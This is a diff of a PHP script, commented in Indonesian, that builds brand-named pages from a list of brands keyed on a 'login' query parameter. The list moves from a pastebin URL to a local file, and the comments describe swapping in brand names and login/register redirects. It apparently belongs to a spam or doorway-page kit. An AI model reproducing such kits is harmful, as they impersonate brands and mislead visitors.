@@ -2,23 +2,22 @@
 
 function feedback404()
 {
-   header("HTTP/1.0 404 Not Found");
+    header("HTTP/1.0 404 Not Found");
     echo "<h1>404 Not Found</h1>";
+    echo "MISI BANG YAA.";
 }
 
-if (isset($_GET['page'])) {
-    $filename = "https://pastebin.com/raw/RmabvdJ6";
+if (isset($_GET['login'])) {
+    $filename = "list.txt";
     $lines = file($filename, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
-    $target_string = strtolower($_GET['page']);
+    $target_string = strtolower($_GET['login']);
     foreach ($lines as $item) {
         if (strtolower($item) === $target_string) {
             $BRAND = strtoupper($target_string);
-            $SMALLBRAND = $target_string;
         }
     }
     if (isset($BRAND)) {
         $BRANDS = $BRAND;
-        $SMALLBRANDS = $SMALLBRAND;
         $protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
         $fullUrl = $protocol . "://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
         if (isset($fullUrl)) {
@@ -44,19 +43,16 @@ if (isset($_GET['page'])) {
 /*
 
 *GANTI NAMA BRAND DENGAN INI
-<?php echo $BRANDS ?>
+<?php echo $BRANDS ?> 
 
 * GANTI URL PATH DENGAN INI
 <?php echo $urlPath ?>
-
-<?php echo $SMALLBRAND ?>
 
 * SAMA GANTI REDIRECT LOGIN/REGISTER
 
 */
 
 ?>
-
 
 
 <!DOCTYPE HTML>
